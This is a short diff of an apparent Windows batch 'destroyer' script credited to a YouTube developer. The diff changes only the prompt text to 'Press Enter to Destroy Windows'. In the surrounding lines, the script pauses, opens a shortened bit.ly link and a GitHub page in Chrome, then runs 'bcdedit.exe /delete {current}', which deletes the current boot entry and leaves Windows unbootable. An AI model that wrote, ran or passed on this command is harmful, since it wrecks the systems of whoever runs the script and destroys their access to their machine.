@@ -31,7 +31,7 @@ echo I      By Crazy Indian Developer      I
 echo I       Subscribe on Youtube!!!       I
 echo I    GitHub Crazy Indian Developer    I
 echo ---------------------------------------
-echo Press Enter 2 times to Destroy Windows!!!!!!!
+echo Press Enter to Destroy Windows!!!!!!!
 pause
 start chrome https://bit.ly/3kAQxwG  https://github.com/CrazyIndianDeveloper
 bcdedit.exe /delete {current}
